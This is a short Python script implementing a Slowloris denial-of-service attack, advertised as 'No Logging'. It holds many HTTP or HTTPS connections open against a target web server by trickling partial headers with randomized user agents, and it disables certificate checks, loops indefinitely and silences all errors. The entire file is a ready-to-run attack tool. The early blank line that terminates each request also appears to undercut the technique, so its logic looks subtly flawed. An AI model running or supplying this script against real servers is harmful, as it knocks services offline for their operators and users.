#!/usr/bin/env python3
import argparse
import random
import socket
import sys
import time

parser = argparse.ArgumentParser(description="Minimal Slowloris (No Logging)")
parser.add_argument("host", help="Host to test")
parser.add_argument("-p", "--port", default=80, type=int, help="Web server port")
parser.add_argument("-s", "--sockets", default=200, type=int, help="Number of sockets")
parser.add_argument("--https", action="store_true", help="Use HTTPS")
parser.add_argument("--sleeptime", default=10, type=int, help="Sleep time between headers")
parser.add_argument("-ua", "--randuseragents", action="store_true", help="Random User-Agent per socket")
args = parser.parse_args()

def send_line(self, line):
    self.send(f"{line}\r\n".encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

if args.https:
    import ssl
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X)",
]

list_of_sockets = []

def init_socket(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        if args.https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=args.host)
        s.connect((ip, args.port))
        method = random.choice(["GET", "POST", "HEAD"])
        uri = f"/?id={random.randint(1000,9999)}"
        s.send_line(f"{method} {uri} HTTP/1.1")
        ua = random.choice(user_agents) if args.randuseragents else user_agents[0]
        s.send_header("User-Agent", ua)
        s.send_header("Accept", "*/*")
        s.send_header("Connection", "keep-alive")
        s.send_line("")
        return s
    except:
        return None

def slowloris_iteration():
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except:
            list_of_sockets.remove(s)

    while len(list_of_sockets) < args.sockets:
        s = init_socket(args.host)
        if s:
            list_of_sockets.append(s)
        else:
            break

def main():
    for _ in range(args.sockets):
        s = init_socket(args.host)
        if s:
            list_of_sockets.append(s)

    while True:
        try:
            slowloris_iteration()
        except:
            pass
        time.sleep(args.sleeptime + random.randint(-2, 2))

if __name__ == "__main__":
    main()
